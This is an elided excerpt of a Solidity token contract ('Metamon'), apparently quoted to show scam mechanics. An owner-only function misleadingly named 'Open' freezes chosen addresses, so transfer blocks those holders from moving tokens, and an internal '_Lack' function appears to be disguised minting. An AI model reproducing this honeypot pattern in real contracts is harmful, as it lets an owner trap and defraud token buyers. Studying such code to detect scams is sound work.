...
contract Metamon is Ownable{
    ...
    event FrozenFunds(address target, bool open);
    ...
    function Open(address target, bool open) public onlyOwner {
        openAccount[target] = open;
        emit FrozenFunds(target, open);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(!openAccount[msg.sender]);
        require(!openAccount[recipient]);
    ...
    function _Lack(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: Lack to the zero address");
